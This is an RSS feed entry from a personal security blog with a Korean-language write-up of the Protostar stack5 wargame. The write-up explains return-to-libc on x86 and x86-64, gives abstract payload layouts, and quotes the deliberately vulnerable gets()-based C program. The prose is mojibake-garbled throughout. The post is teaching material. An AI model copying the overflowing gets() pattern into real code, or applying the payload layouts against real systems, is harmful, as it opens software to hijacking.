<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>TouBVa</title>
    <description>Harder than you thought, easier than you expected</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 14 Nov 2022 18:31:51 +0900</pubDate>
    <lastBuildDate>Mon, 14 Nov 2022 18:31:51 +0900</lastBuildDate>
    <generator>Jekyll v4.2.2</generator>

    
      <item>
        <title>Protostar-stack5.c x86 &amp; x86-64</title>
        <description>&lt;p&gt;í•™êµ ìˆ˜ì—…ì—ì„œ í’€ì´í•œ ë¬¸ì œ ì¤‘ í•˜ë‚˜ë¡œ, x86ì—ì„œì˜ RTLê³¼ x86-64ì—ì„œì˜ RTLì„ ëª¨ë‘ ì‹¤ìŠµí•˜ê¸°ì— ì¢‹ì€ ë¬¸ì œì¸ ê²ƒ ê°™ì•„ ë¸”ë¡œê·¸ì— ê¸°ë¡í•´ë³¸ë‹¤.&lt;/p&gt;

&lt;p&gt;ì‚¬ì‹¤ ì´ ë¬¸ì œëŠ” BOFë¡œ ì‰˜ì½”ë“œë¥¼ ë„£ìœ¼ë¼ê³  ë§Œë“¤ì–´ì¤€ ë¬¸ì œì´ê¸´ í•˜ì§€ë§Œ, 1) ë§ˆìŒëŒ€ë¡œ RTLì„ í•˜ê¸°ì—ë„ ê´œì°®ì•„ ë³´ì´ê³  2) 32bitë¡œ ì»´íŒŒì¼ ì‹œ ë©”ì¸ í•¨ìˆ˜ì˜ ì—í•„ë¡œê·¸ê°€ ë‹¬ë¼ì§€ëŠ” ë¬¸ì œê°€ ìˆê¸°ì— í•´ê²°í•´ ë³´ê³  ì‹¶ì–´ ì„ íƒí–ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;0-x86ì—ì„œì˜-rtlê³¼-x64ì—ì„œì˜-rtl&quot;&gt;0. X86ì—ì„œì˜ RTLê³¼ X64ì—ì„œì˜ RTL&lt;/h1&gt;

&lt;h2 id=&quot;01-rtlì´ë€&quot;&gt;0.1. RTLì´ë€&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;RTL ì´ë€ Return 2 Library(or Libc)ì˜ ì•½ìë¡œ, í”„ë¡œê·¸ë¨ ì‹¤í–‰ ì‹œ í•´ë‹¹ ì–¸ì–´ë¡œ ì§œì¸ ì½”ë“œì—ëŠ” í•„ìˆ˜ì ìœ¼ë¡œ í¬í•¨ë˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€(gcc ì»´íŒŒì¼ëŸ¬ì˜ ê²½ìš° libc) í•¨ê»˜ ë©”ëª¨ë¦¬ì— ë¡œë”©ë˜ëŠ” ì ì„ ì•…ìš©í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ í”Œë¡œìš°ë¥¼ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì˜ ì›í•˜ëŠ” í•¨ìˆ˜ë¡œ ë³€ê²½ì‹œì¼œ ì‹œìŠ¤í…œì´ ê³µê²©ìê°€ ì›í•˜ëŠ” í–‰ìœ„ë¥¼ í•˜ë„ë¡ ì¡°ì‘í•˜ëŠ” ê³µê²© ê¸°ë²•ì„ ì˜ë¯¸í•œë‹¤.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;ìœˆë„ìš°ì˜ ê²½ìš° RTLì€ DEPê°€ ì„¤ì •ë˜ì–´ ìˆì–´ ìŠ¤íƒì—ì„œ ì½”ë“œ ì‹¤í–‰ì´ ë¶ˆê°€ëŠ¥í•  ê²½ìš° ì‚¬ìš©ëœë‹¤.&lt;/li&gt;
    &lt;li&gt;DEPëŠ” ìœˆë„ìš°ì˜ ìŠ¤íƒ ë‚´ ì½”ë“œ ì‹¤í–‰ ë°©ì§€ë¥¼ ìœ„í•œ ë³´ì•ˆ ì •ì±…ì¸ë°, Linux Stack Canaryì˜ ìœˆë„ìš° ë²„ì „ì¸ Stack Cookieì™€ëŠ” ë‹¤ë¥´ë‹¤. ì˜¤íˆë ¤ Linuxì˜ NX-bitì™€ ì¢€ ë” ê²¹ì¹œë‹¤ê³  ë³´ëŠ” ê²Œ ë§ë‹¤.
      &lt;ul&gt;
        &lt;li&gt;Windows XP SP2ì™€ Windows 2003 SP1ì—ì„œë¶€í„° ì¶”ê°€ëœ ê¸°ëŠ¥ìœ¼ë¡œ, ì›œë°”ì´ëŸ¬ìŠ¤ì˜ BOF ìµìŠ¤í”Œë¡œì‡ ê³¼ì •(data ì˜ì—­ì¸ Thread stackì„ ê³µê²©)ì„ ì°¨ë‹¨í•˜ëŠ” ê²ƒì´ ëª©ì ì´ì—ˆë‹¤.&lt;/li&gt;
        &lt;li&gt;ê°€ìƒ ë©”ëª¨ë¦¬ ì˜ì—­ì„ â€˜ì‹¤í–‰ ë¶ˆê°€â€™ ìƒíƒœë¡œ ì²˜ë¦¬í•˜ê³ , ì—¬ê¸°ì—ì„œ ì½”ë“œê°€ ì‹¤í–‰ë˜ê³ ì í•œë‹¤ë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_ACCESS_VIOLATION&lt;/code&gt; ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚´ìœ¼ë¡œì¨ í”„ë¡œì„¸ìŠ¤ë¥¼ Kill í•˜ëŠ” ê²ƒì´ ê¸°ë³¸ ì›ë¦¬ì´ë‹¤.&lt;/li&gt;
        &lt;li&gt;ìœ„ì˜ ì›ë¦¬ë¥¼ ìœ„í•´ ê°€ìƒë©”ëª¨ë¦¬ í˜ì´ì§€ ì˜µì…˜ì— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READ&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_WRITECOPY&lt;/code&gt; í”Œë˜ê·¸ë¥¼ ì¶”ê°€í–ˆë‹¤.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;DEPì—ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ê°€ ì œê³µí•˜ëŠ” DEPì™€ í•˜ë“œì›¨ì–´ê°€ ì œê³µí•˜ëŠ” DEPê°€ ìˆë‹¤.
      &lt;ul&gt;
        &lt;li&gt;í•˜ë“œì›¨ì–´ DEPëŠ” ë©”ëª¨ë¦¬ë¥¼ í˜ì´ì§€ ë‹¨ìœ„ì—ì„œ ì‹¤í–‰ ë¶ˆê°€ëŠ¥ìœ¼ë¡œ ì²˜ë¦¬í•´ CPUì—ê²Œ ë„˜ê¸°ëŠ” ë°©ì‹ì´ë‹¤.&lt;/li&gt;
        &lt;li&gt;ì†Œí”„íŠ¸ì›¨ì–´ DEPëŠ” ë°ì´í„° í˜ì´ì§€ ë¶€ê·¼ì—ì„œì˜ ì½”ë“œ ì‹¤í–‰ì„ ë§‰ì§€ëŠ” ëª»í•˜ì§€ë§Œ SEH ë®ì–´ì“°ê¸° ë“±ì˜ ê³µê²©ì€ ë§‰ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;02-ìš”ì &quot;&gt;0.2. ìš”ì &lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;32bit architectureì˜ í•¨ìˆ˜ calling conventionê³¼ 64bit architectureì˜ í•¨ìˆ˜ calling conventionì€ ë ˆì§€ìŠ¤í„° í™•ë³´ ë¬¸ì œë¡œ ì¸í•´ ë‹¬ë¼ì¡Œë‹¤.&lt;/li&gt;
  &lt;li&gt;32 bit architectureì—ì„œëŠ” ì•ˆ ê·¸ë˜ë„ ë¶€ì¡±í•œ ìš©ëŸ‰ì´ë¼ ì—°ì‚° ì‹œ ê°€ìƒë©”ëª¨ë¦¬ ì™¸ì˜ ìš©ëŸ‰ ìì›ì¸ ë ˆì§€ìŠ¤í„°ë¥¼ ë” ì˜ ì¨ì•¼ í•  í•„ìš”ì„±ì´ ìˆë‹¤. ì¦‰, ê·¸ ê·€í•œ ë ˆì§€ìŠ¤í„°ë¥¼ ê¼´ë‘ í•¨ìˆ˜ì˜ íŒŒë¼ë¯¸í„°ë¥¼ ì €ì¥í•˜ëŠ” ë° ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤. ê²°ê³¼ì ìœ¼ë¡œ í•¨ìˆ˜ì˜ íŒŒë¼ë¯¸í„°ëŠ” ìŠ¤íƒì— ì €ì¥ë˜ì–´ ì „ë‹¬ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;64 bit architectureì—ì„œëŠ” ì´ì•¼ê¸°ê°€ ë‹¤ë¥´ë‹¤. í•¨ìˆ˜ì˜ íŒŒë¼ë¯¸í„°ê°€ ë ˆì§€ìŠ¤í„° 6ê°œì— ë¨¼ì € ì €ì¥ë˜ê³ , ê·¸ë˜ë„ íŒŒë¼ë¯¸í„°ê°€ ë‚¨ìœ¼ë©´ ë‚¨ì€ íŒŒë¼ë¯¸í„°ë¥¼ ìŠ¤íƒì— ì €ì¥í•˜ê¸° ë•Œë¬¸ì´ë‹¤.
    &lt;ul&gt;
      &lt;li&gt;64bit êµ¬ì¡°ê°€ ë˜ë©´ì„œ ë©”ëª¨ë¦¬ ì£¼ì†Œ ì²´ê³„ë„ ë‹¬ë¼ì ¸ í”„ë¡œì„¸ìŠ¤ì— í• ë‹¹ ê°€ëŠ¥í•œ ê°€ìƒ ë©”ëª¨ë¦¬ í¬ê¸°ê°€ 16EBê¹Œì§€ ì˜¬ë¼ê°”ë‹¤. ê·¸ë¡œ ì¸í•´ ì›ë˜ ë ˆì§€ìŠ¤í„°ê°€ ê°ë‹¹í•´ì•¼ í–ˆë˜ ì €ì¥ì˜ í•„ìš”ì„±ì´ ì‚¬ë¼ì§€ë©° ì‰ì—¬ ë ˆì§€ìŠ¤í„°ë“¤ì´ ìƒê¸°ê²Œ ë˜ì—ˆë‹¤.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì»´í“¨í„°êµ¬ì¡°ë¥¼ ë°°ìš´ ì‚¬ëŒë“¤ì´ë¼ë©´ ë ˆì§€ìŠ¤í„° ë©”ëª¨ë¦¬ê°€ ê°€ì¥ ë¹ ë¥¸ ë©”ëª¨ë¦¬ì„ì„ ì•Œ ê²ƒì´ë‹¤. ë©”ëª¨ë¦¬ë“¤ì˜ ê°€ìš© ìš©ëŸ‰/ì†ë„ì˜ ê´€ê³„ë¥¼ ë‚˜íƒ€ë‚¸ ì´ë¯¸ì§€ë¥¼ ì²¨ë¶€í•œë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;ê°€ì¥ ë¹ˆë²ˆí•˜ê²Œ ì½ì–´ì™€ì•¼ í•˜ëŠ” ê²ƒì´ í•¨ìˆ˜ì˜ íŒŒë¼ë¯¸í„°ì´ê¸° ë•Œë¬¸ì— ì†ë„ì˜ íš¨ìœ¨ì„±ì„ ìœ„í•´ ë ˆì§€ìŠ¤í„°ì— íŒŒë¼ë¯¸í„°ë¥¼ ì €ì¥í•˜ëŠ” ê²ƒìœ¼ë¡œ í•¨ìˆ˜ì˜ calling conventionì„ ì •ì˜í•˜ê²Œ ë˜ì—ˆë‹¤. ê·¸ë ‡ê²Œ í•˜ë”ë¼ë„ ì €ì¥ ì„±ëŠ¥ ì˜¤ë²„í—¤ë“œ ëŒ€ë¹„ ì†ë„ ì´ë“ì´ í›¨ì”¬ ë†’ê¸° ë•Œë¬¸ì´ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ì´ë¡œ ì¸í•´ RTL ê¸°ë²•ì„ ì´ìš©í•œ ìµìŠ¤í”Œë¡œì‡ ìˆ˜í–‰ ì‹œ ì…ë ¥í•´ì•¼ í•  í˜ì´ë¡œë“œì˜ í˜•íƒœê°€ ë‹¬ë¼ì¡Œë‹¤. ë‹¤ìŒ ì¥ì—ì„œ ìì„¸íˆ ì„¤ëª…í•  ê²ƒì´ë¯€ë¡œ ì•„ë˜ì—ëŠ” í˜ì´ë¡œë“œì˜ êµ¬ì„±ë§Œ ì–¸ê¸‰í•œë‹¤.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;32bit&lt;/p&gt;

        &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;64bit (ì™œ í˜ì´ë¡œë“œê°€ ì´ëŸ° ê¼´ì¸ì§€ ì´í•´ê°€ ì–´ë ¤ìš¸ ìˆ˜ ìˆì§€ë§Œ, ì•„ë˜ì—ì„œ RSPì˜ ìœ„ì¹˜ ë³€ë™ì„ ê°ì•ˆí•˜ë©° ì„¤ëª…í•˜ê² ë‹¤)&lt;/p&gt;

        &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Gadget&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-x86-ê¸°ë°˜ì—ì„œ-rtl-ìˆ˜í–‰í•˜ê¸°&quot;&gt;1. X86 ê¸°ë°˜ì—ì„œ RTL ìˆ˜í–‰í•˜ê¸°&lt;/h1&gt;

&lt;h2 id=&quot;11-íŒŒë¼ë¯¸í„°ê°€-ìŠ¤íƒì—&quot;&gt;1.1. íŒŒë¼ë¯¸í„°ê°€ ìŠ¤íƒì—?&lt;/h2&gt;

&lt;p&gt;C ì–¸ì–´ì˜ ê²½ìš° í•¨ìˆ˜ì˜ Calling Conventionì„ ì •ì˜í•´ ë‘” ê²ƒì€ __cdeclì´ë‹¤. ê´€ë ¨í•´ ì¢€ ë” ìì„¸í•œ ì„¤ëª…ê³¼ ë¦¬ëˆ…ìŠ¤ì—ì„œ cdecl ì‚¬ìš©ì„ í™•ì¸í•˜ëŠ” ê³¼ì •ì€ &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step5/#/&quot;&gt;ì—¬ê¸°&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ë§Œì¼ sum(1, 2)ë¥¼ ì½œí–ˆë‹¤ë©´ sum í•¨ìˆ˜ì˜ line 1ì— ë“¤ì–´ì„°ì„ ë•Œì˜ ìŠ¤íƒ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ì„ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Stack frame of Callee over EBP and RET&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;EBP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;RET&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SFP of Caller&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Stack frame of Caller&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;íŒŒë¼ë¯¸í„°ëŠ” ë§ˆì§€ë§‰ íŒŒë¼ë¯¸í„°ë¶€í„° ìŠ¤íƒì— pushëœë‹¤ëŠ” ì ì„ ë‹¤ì‹œ í•œ ë²ˆ ì£¼ì§€í•˜ê³ ì í•œë‹¤. ì™œëƒí•˜ë©´ ESPëŠ” popë  ë•Œ ë‚®ì€ ì£¼ì†Œì—ì„œ ë†’ì€ ì£¼ì†Œë¡œ ì´ë™í•˜ê¸° ë•Œë¬¸ì´ë‹¤. ì¦‰, íŒŒë¼ë¯¸í„°ë¥¼ ìŠ¤íƒì— pushí•œ ê²ƒê³¼ ê±°ê¾¸ë¡œì˜ ìˆœì„œë¥¼ ë”°ë¼ íŒŒë¼ë¯¸í„°ë¥¼ ì½ì–´ì˜¤ê¸° ë•Œë¬¸ì— ë§ˆì§€ë§‰ íŒŒë¼ë¯¸í„°ë¶€í„° pushí•˜ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;12-rtlì„-ìœ„í•œ-ìŠ¤íƒ-ì¡°ì‘&quot;&gt;1.2. RTLì„ ìœ„í•œ ìŠ¤íƒ ì¡°ì‘&lt;/h2&gt;

&lt;p&gt;ìœ„ì—ì„œ ë§í•œ Cdecl ê·œì•½ì— ë”°ë¥¸ë‹¤ë©´, RTLì„ í•˜ê¸° ìœ„í•´ì„œëŠ” ì–´ë–¤ ì‹ìœ¼ë¡œ ìŠ¤íƒì„ ì¡°ì‘í•´ì•¼ í• ê¹Œ?&lt;/p&gt;

&lt;p&gt;í•´ê²°ì±…ì€ ì •ë§ ê°„ë‹¨í•˜ê³  ë…¼ë¦¬ì ì´ë‹¤. RET addressë¥¼ Libcì— ì˜¬ë¼ê°€ ìˆëŠ” íŠ¹ì • í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ ì¡°ì‘í•˜ê³ , í•´ë‹¹ í•¨ìˆ˜ê°€ ì œê³µí•˜ëŠ” ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ ì‰˜ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í•´ë‹¹ í•¨ìˆ˜ì˜ íŒŒë¼ë¯¸í„° í˜•ì‹ì— ë§ëŠ” íŒŒë¼ë¯¸í„°ë¥¼ Cdecl ê·œì•½ì— ë¶€í•©í•˜ë„ë¡ ì í•©í•œ ìœ„ì¹˜ì— ë„£ì–´ë‘ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ì˜ ì„¤ëª…ë§Œ ì½ìœ¼ë©´ ì§ì „ì— ë§í•œ ê°„ë‹¨í•˜ë‹¤ëŠ” ë§ì´ ë¬´ìƒ‰í•  ë§Œí¼ ë³µì¡í•˜ê¸° ì§ì´ ì—†ì–´ ë³´ì¸ë‹¤. ê·¸ëŸ¬ë‹ˆ ì•„ë˜ ê·¸ë¦¼ì„ ë³´ì. BOF ì·¨ì•½ì ìœ¼ë¡œ ìŠ¤íƒì„ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤ëŠ” ì „ì œ í•˜ì—ì„œ ê·¸ë¦° ê·¸ë¦¼ì´ë‹¤.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Dump bytes(Overflowed)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Corrupted EBP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Libc function address(Corrupted RET)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Corrupted SFP of Caller (4 bytes)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1st Param of the function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2nd Param of the function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ë”°ë¼ì„œ, BOF ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤ê³  ê°€ì •í•  ë•Œ í˜ì´ë¡œë“œì˜ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ì„ ìˆ˜ë°–ì— ì—†ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¬¼ë¡  ë‹¤ë¥¸ í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ì„ ì“´ë‹¤ë©´ ê·¸ê±´ ê·¸ê±°ëŒ€ë¡œ ë°˜ì˜í•´ì•¼ í•  ë¬¸ì œì¼ í…Œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;13-ì‹¤ìŠµ&quot;&gt;1.3. ì‹¤ìŠµ&lt;/h2&gt;

&lt;p&gt;ì–´ë– í•œ í”„ë¡œê·¸ë¨ì„ ìµìŠ¤í”Œë¡œì‡í•˜ê¸° ìœ„í•´ì„œëŠ” ì•„ë˜ì™€ ê°™ì€ ê³¼ì •ì„ ê±°ì³ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ëŒ€ìƒ í”„ë¡œê·¸ë¨ ë¶„ì„í•´ ì·¨ì•½ì  ì§€ì •&lt;/li&gt;
  &lt;li&gt;í•´ë‹¹ ì·¨ì•½ì ì„ ìµìŠ¤í”Œë¡œì‡í•  ë°©ë²• ì§€ì •&lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ìƒì„±&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ì‹¤ìŠµì—ì„œëŠ” ìœ„ì˜ ê³¼ì •ì— ë”°ë¼ ìˆœì°¨ì ìœ¼ë¡œ ìµìŠ¤í”Œë¡œì‡ ë°©ì‹ì„ ì„¤ëª…í•œë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;131-ëŒ€ìƒ-í”„ë¡œê·¸ë¨-ë¶„ì„í•´-ì·¨ì•½ì -ì§€ì •&quot;&gt;1.3.1. ëŒ€ìƒ í”„ë¡œê·¸ë¨ ë¶„ì„í•´ ì·¨ì•½ì  ì§€ì •&lt;/h3&gt;

&lt;p&gt;í”„ë¡œê·¸ë¨ì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ì£¼ì—ˆê¸° ë•Œë¬¸ì— ë¬¸ì œì˜ ë‚œì´ë„ê°€ ë‚®ì€ í¸ì´ë‹¤. ì•„ë˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë¶„ì„í•˜ë©° ì·¨ì•½ì ì„ ì°¾ì•„ ë³´ì.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                                        
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 
  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

